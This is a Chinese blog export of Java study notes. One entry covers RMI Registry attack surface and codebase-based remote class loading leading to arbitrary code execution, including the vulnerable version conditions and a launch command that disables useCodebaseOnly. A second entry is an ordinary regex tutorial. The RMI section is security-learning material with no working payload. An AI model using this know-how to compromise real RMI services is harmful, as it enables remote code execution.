<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8494</span>).bind(<span class="string">&quot;R1&quot;</span>, </span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">new</span> RemoteObject(), <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    Naming.bind(<span class="string">&quot;rmi://127.0.0.1:8494/R1&quot;</span>, </span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">new</span> RemoteObject (), <span class="number">0</span>));</span><br></pre></td></tr></table></figure>





<p>通常在创建RMI Registry的时候,都会直接绑定一个对象在上面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>,<span class="keyword">new</span> RemoteHello());</span><br></pre></td></tr></table></figure>

<p>第一行创建RMI Registry,第二行将RemoteHello对象绑定到Hello这个路径上面</p>
<p><code>Naming.bind </code>的第一个参数是一个URL，形如：<code>rmi://host:port/name</code>。其中，<code>host</code>和<code>port</code>就是 RMI Registry的地址和端口，<code>name</code>是远程对象的名字。</p>
<h4 id="两个关于攻击的问题"><a href="#两个关于攻击的问题" class="headerlink" title="两个关于攻击的问题"></a>两个关于攻击的问题</h4><ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
</ol>
<p>我的理解是如果能访问RMI Regittry服务,但也仅仅是能访问,缺少对应的攻击方法,如何在Server中创建恶意对象和攻击方法….</p>
<p>JAVA中对于远程访问RMI Regittry服务做了限制,只有来源是本地的时候才能调用<code>rebind</code>,<code>bind</code>,<code>unbind</code>方法来修改绑定的对象和方法</p>
<p>但是可以通过list方法和lookup可以远程调用,使用Naming.list</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://127.0.0.1:9999&quot;</span>);</span><br><span class="line"><span class="comment">//使用该方法可以获取绑定到该端口的远程对象名字数组</span></span><br><span class="line">Naming.lookup可以调用该方法</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结</p>
<p>能访问到RMI Registry服务,需要目标Server上面有比较危险的方法供我们调用才能造成攻击</p>
</blockquote>
<ol start="2">
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
<p>如果能够控制<code>RMI客户端</code>中RMI Registry的地址,那么自己就可以在攻击机上面创建对应的恶意方法让其远程调用</p>
<h3 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h3><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
<p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 <code>org.vulhub.example.Example</code> 类，则 Java虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为 Example类的字节码。</p>
<blockquote>
<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。</p>
</blockquote>
<p>在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
<p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击： </p>
<ul>
<li>安装并配置了SecurityManager </li>
<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false </li>
<li>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置： <ul>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> </li>
<li><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a> </li>
</ul>
</li>
</ul>
<p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为<code> true</code> 的情况下，<strong>Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</strong></p>
<p>java -Djava.rmi.server.hostname=192.168.135.142 - Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</p>
<p>这个复现出现了问题,自己百度没有解决,等解决了再继续</p>
<p>客户端和服务端都需要定义一个接口继承Remote接口，但是服务端需要实现这个接口，毕竟调用的是服务端的方法，它是实打实存在的</p>
<p>服务端必须继承<code>UnicastRemoteObject</code>类</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>java正则表达式</title>
    <url>/2021/12/06/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>首先感谢<a href="https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver">韩顺平老师的课程</a>!!</p>
<h4 id="正则匹配中贪婪模式和非贪婪模式的区别"><a href="#正则匹配中贪婪模式和非贪婪模式的区别" class="headerlink" title="正则匹配中贪婪模式和非贪婪模式的区别"></a>正则匹配中贪婪模式和非贪婪模式的区别</h4><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>
<h4 id="java正则简单实现"><a href="#java正则简单实现" class="headerlink" title="java正则简单实现"></a>java正则简单实现</h4><p>简单实践,后面记录各个类和方法的信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。&quot;</span> +</span><br><span class="line">                <span class="string">&quot;2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。&quot;</span> +</span><br><span class="line">                <span class="string">&quot;2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），&quot;</span> +</span><br><span class="line">                <span class="string">&quot;代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、&quot;</span> +</span><br><span class="line">                <span class="string">&quot;格式化I/O及可变参数。&quot;</span>;</span><br><span class="line">		<span class="comment">//匹配数字或者单词</span></span><br><span class="line">        Pattern pattern = Pattern.compile(<span class="string">&quot;\\d\\d\\d\\d&quot;</span>);</span><br><span class="line">        <span class="comment">//2.创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="comment">//可以循环匹配</span></span><br><span class="line">        <span class="keyword">while</span>(matcher.find())&#123;</span><br><span class="line">            <span class="comment">//匹配文本放到matcher.group(0)</span></span><br><span class="line">            System.out.println(<span class="string">&quot;找到&quot;</span>+matcher.group(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="matcher-find-完成的任务"><a href="#matcher-find-完成的任务" class="headerlink" title="matcher.find()完成的任务:"></a><code>matcher.find()</code>完成的任务:</h5><p>1.根据指定的规则定位满足规则的子字符串(比如2000)</p>
<p>2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;</p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png" alt="image-20211207000454930"></p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png"></p>
<p>groups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4</p>
<p>3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配</p>
<p>group()源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">group</span><span class="params">(<span class="keyword">int</span> group)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (first &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;No match found&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (group &lt; <span class="number">0</span> || group &gt; groupCount())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">&quot;No group &quot;</span> + group);</span><br><span class="line">        <span class="keyword">if</span> ((groups[group*<span class="number">2</span>] == -<span class="number">1</span>) || (groups[group*<span class="number">2</span>+<span class="number">1</span>] == -<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> getSubSequence(groups[group * <span class="number">2</span>], groups[group * <span class="number">2</span> + <span class="number">1</span>]).toString();<span class="comment">//截取字符串</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置</p>
<p>如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!<img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png"></p>
<p><code>Pattern pattern = Pattern.compile(&quot;(\\d\\d)(\\d\\d)&quot;);</code>加上括号,分组匹配:</p>
<p>根据指定的规则，定位满足规则的子字符串(比如(20)(00))</p>
<p>1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；<br>2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4<br>2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2<br>2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4</p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png"></p>
<p>2.4 如果有更多的分组，同理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第一组匹配到的值: &quot;</span> + matcher.group(<span class="number">1</span>)); <span class="comment">// 2</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第二组匹配到的值: &quot;</span> + matcher.group(<span class="number">2</span>)); <span class="comment">// 000</span></span><br><span class="line">            <span class="comment">// System.out.println(&quot;找到：&quot; + matcher.group(3)); 索引越界</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png" style="zoom:80%;" />

<p>3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。</p>
<p><strong>我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容</strong></p>
<h5 id="转义字符的使用"><a href="#转义字符的使用" class="headerlink" title="转义字符的使用"></a>转义字符的使用</h5><p>注:在java的正则表达式中,两个\\代表一个\</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content = <span class="string">&quot;abc$(a.bc(123(&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 俩个 \\ 字符表示 \</span></span><br><span class="line">        Pattern compile = Pattern.compile(<span class="string">&quot;\\(&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher = compile.matcher(content);</span><br><span class="line">        <span class="comment">// 3. 可以循环匹配</span></span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="comment">// 匹配内容，文本，放到 m.group(0)</span></span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h4><p>java正则表达式默认是区分大小写的,如何实现不区分大小写</p>
<ul>
<li>(?i)abc      表示abc都不区分大小写</li>
<li>a(?i)bc       表示bc不区分大小写</li>
<li>a((?i)b)c     表示只有b不区分大小写</li>
<li><code>Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);</code>开启不区分大小写的匹配,整个regEx都不区分大小写</li>
</ul>
<h4 id="关于-的一些注意点"><a href="#关于-的一些注意点" class="headerlink" title="关于[ ]的一些注意点"></a>关于[ ]的一些注意点</h4><p>^在[ ]内表示非</p>
<p>[ ]内的任意字符之间都是或的关系</p>
<p>[ ]内的符号就只是一个符号了,不带特殊功能    <strong>注意:在( )内要加转义符</strong></p>
<h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>(abc)*</td>
<td>仅包含任意个abc的字符串</td>
</tr>
<tr>
<td>m+(abc)*</td>
<td>以m开头,后接任意个abc的字符串</td>
</tr>
<tr>
<td>m+abc?</td>
<td>以m开头,后接ab或者abc的字符串</td>
</tr>
<tr>
<td>[abcd]{3}</td>
<td>由abcd中字母组成的任意长度为3的字符串</td>
</tr>
<tr>
<td>[abcd]{3,}</td>
<td>由abcd中字母组成的任意长度不小于3的字符串</td>
</tr>
<tr>
<td>[abcd]{3,5}</td>
<td>由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开)</td>
</tr>
</tbody></table>
<p>java匹配默认贪婪匹配</p>
<h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><p>定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>指定起始字符</td>
<td>^[0-9]+[a-z]*</td>
<td>以至少1个数字开头,后接任意个小写字母的字符串</td>
</tr>
<tr>
<td>$</td>
<td>指定结束字符</td>
<td>^[0-9]\-[a-z]+$</td>
<td>以1个数字开头后接连字符”-“,并以至少1个小写字母结尾的字符串</td>
</tr>
<tr>
<td>\b</td>
<td>匹配目标字符串的边界</td>
<td>er\b</td>
<td>匹配forev<code>er</code>中的er,但不匹配verb中的er</td>
</tr>
<tr>
<td>\B</td>
<td>匹配目标字符串的非边界</td>
<td>er\B</td>
<td>匹配v<code>er</code>b中的er,但不匹配forever中的er</td>
</tr>
</tbody></table>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><h5 id="pattern"><a href="#pattern" class="headerlink" title="(pattern)"></a>(pattern)</h5><p>非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号</p>
<h5 id="lt-name-gt"><a href="#lt-name-gt" class="headerlink" title="(?&lt;name&gt;)"></a>(?&lt;name&gt;)</h5><p>命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?’name’)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;dsfdsfds s7789 nn1189han&quot;</span>;</span><br><span class="line"><span class="comment">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span></span><br><span class="line">        String regStr=<span class="string">&quot;(?&lt;g1&gt;\\d\\d)(?&lt;g2&gt;\\d\\d)&quot;</span>;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        <span class="comment">//创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">            System.out.println(<span class="string">&quot;分组1(根据组名): &quot;</span>+matcher.group(<span class="string">&quot;g1&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组1: &quot;</span>+matcher.group(<span class="number">1</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组2(根据组名): &quot;</span>+matcher.group(<span class="string">&quot;g2&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组2: &quot;</span>+matcher.group(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png"></p>
<h4 id="非捕获分组"><a href="#非捕获分组" class="headerlink" title="非捕获分组"></a>非捕获分组</h4><h5 id="pattern-1"><a href="#pattern-1" class="headerlink" title="(?:pattern)"></a>(?:pattern)</h5><p>非捕获分组不算入分组内,即不能通过group(i)去访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;124张三男士  hell张三先生   张三同学  &quot;</span>;</span><br><span class="line"><span class="comment">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span></span><br><span class="line">        String regStr=<span class="string">&quot;张三(?:男士|先生|同学)&quot;</span>;<span class="comment">//等价于:张三男士|张三先生|张三同学</span></span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        <span class="comment">//创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png"></p>
<h5 id="pattern-2"><a href="#pattern-2" class="headerlink" title="(?=pattern)"></a>(?=pattern)</h5><p>它是一个非捕获匹配,例如,”windows(?=95|98|NT|2000)”匹配”windows2000”中的”windows”,但不匹配”windows10”中的windows</p>
<p>(理解这个等号的含义即可)</p>
<h5 id="pattern-3"><a href="#pattern-3" class="headerlink" title="(?!pattern)"></a>(?!pattern)</h5><p>与上一个刚好相反,例如,”windows(?=95|98|NT|2000)”匹配”windows10”中的”windows”,但不匹配”windows2000”中的windows</p>
<p>(理解!与=的相反含义)</p>
<h4 id="匹配汉字"><a href="#匹配汉字" class="headerlink" title="匹配汉字"></a>匹配汉字</h4><p><code>resStr = &quot;^[\u0391-\uffe5]+$&quot;</code></p>
<p>上面的regStr匹配纯汉字</p>
<p>\u0391-\uffe5是汉字的编码范围</p>
<p>一些练习:</p>
<p>匹配1-9开头的六位数:  <code>^[1-9]\\d&#123;5&#125;$</code></p>
<p>匹配必须以13,14,15,18开头的11位数: <code>^1[3458]\\d&#123;9&#125;$</code></p>
<p>匹配小数或者整数 <code>^[-+]?([1-9]\\d*|0)(\\.\\d+)?$</code></p>
<h3 id="三个常用类"><a href="#三个常用类" class="headerlink" title="三个常用类"></a>三个常用类</h3><h4 id="Pattern类"><a href="#Pattern类" class="headerlink" title="Pattern类"></a>Pattern类</h4><p>Pattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern p=Pattern.compile(regStr);</span><br></pre></td></tr></table></figure>

<h5 id="matches方法"><a href="#matches方法" class="headerlink" title="matches方法"></a>matches方法</h5><p>如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组</p>
<p><code>Pattern.matches(regStr,content)</code></p>
<h3 id="Matcher类"><a href="#Matcher类" class="headerlink" title="Matcher类"></a>Matcher类</h3><p>Matcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Matcher matcher= pattern.matcher(content);</span><br></pre></td></tr></table></figure>

<h5 id="matcher-start-获取find每一组开始的索引"><a href="#matcher-start-获取find每一组开始的索引" class="headerlink" title="matcher.start();获取find每一组开始的索引"></a>matcher.start();获取find每一组开始的索引</h5><h5 id="matcher-end-获取find每一组尾部的索引"><a href="#matcher-end-获取find每一组尾部的索引" class="headerlink" title="matcher.end();获取find每一组尾部的索引"></a>matcher.end();获取find每一组尾部的索引</h5><h5 id="replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent"><a href="#replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent" class="headerlink" title="replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent"></a>replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class r1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String content=&quot;我确实是个傻缺&quot;;</span><br><span class="line">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span><br><span class="line">        String regStr=&quot;确实&quot;;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        //创建一个匹配器对象</span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        while (matcher.find()) &#123;</span><br><span class="line">            String newContent=matcher.replaceAll(&quot;雀氏&quot;);</span><br><span class="line">            System.out.println(newContent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="PatternSyntaxException类"><a href="#PatternSyntaxException类" class="headerlink" title="PatternSyntaxException类"></a>PatternSyntaxException类</h3><p>PatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误</p>
<h4 id="分组-捕获-反向引用"><a href="#分组-捕获-反向引用" class="headerlink" title="分组,捕获,反向引用"></a>分组,捕获,反向引用</h4><p>1.分组</p>
<p>我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)</p>
<p>2.捕获</p>
<p>把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容</p>
<p>3.<strong>反向引用</strong></p>
<p>圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用<code>\\分组号</code>,外部反向引用<code>$分组号</code></u></p>
<p>例子,匹配回文数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String regStr=<span class="string">&quot;(\\d)(\\d)\\2\\1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>—应用示例:</p>
<p>结巴程序:把 类似: “我….我要….学学学学….编程java!”   通过正则表达式修改为”我要学编程java!”</p>
<p>思路:</p>
<p>1.去掉所有的点</p>
<p>2.去除所有重复字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;我....我要....学学学学....编程java!&quot;</span>;</span><br><span class="line">        <span class="comment">//1.去掉所有的点</span></span><br><span class="line">        String regStr=<span class="string">&quot;\\.&quot;</span>;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        content=matcher.replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        <span class="comment">//2去除所有重复字</span></span><br><span class="line">        regStr=<span class="string">&quot;(.)\\1+&quot;</span>;<span class="comment">//只会匹配到1-多的字符串</span></span><br><span class="line">        pattern=Pattern.compile(regStr);</span><br><span class="line">        matcher=pattern.matcher((content));</span><br><span class="line">        content=matcher.replaceAll(<span class="string">&quot;$1&quot;</span>);<span class="comment">//分组的表达式外引用</span></span><br><span class="line">        System.out.println(content);</span><br><span class="line">    	<span class="comment">//第2步的代码也可以用一行代码替换</span></span><br><span class="line">        <span class="comment">/*content=Pattern.compile(&quot;(.)\\1+&quot;).matcher(content).replaceAll(&quot;$1&quot;);</span></span><br><span class="line"><span class="comment">        System.out.println(content);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="String类中使用正则表达式"><a href="#String类中使用正则表达式" class="headerlink" title="String类中使用正则表达式"></a>String类中使用正则表达式</h4><p>String类中可以直接使用</p>
<ol>
<li><p>replaceAll()方法</p>
</li>
<li><p>matches()方法</p>
</li>
<li><p>分割功能    split()方法中可以使用正则表达式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;hello#abc-jack12smith~河南&quot;</span>;</span><br><span class="line">        <span class="comment">//要求按照#或-或~或数字来分割</span></span><br><span class="line">        String[]spilt = content.split(<span class="string">&quot;#|~|-|\\d+&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(String s : spilt)&#123;<span class="comment">//类似于foreach</span></span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png"></p>
</li>
</ol>
<h4 id="写正则表达式思路"><a href="#写正则表达式思路" class="headerlink" title="写正则表达式思路"></a>写正则表达式思路</h4><p>1.先写出一个简单的表达式,接着根据各种情况来逐渐完善</p>
<p>2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>java类加载</title>
    <url>/2022/03/23/java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><span id="more"></span>

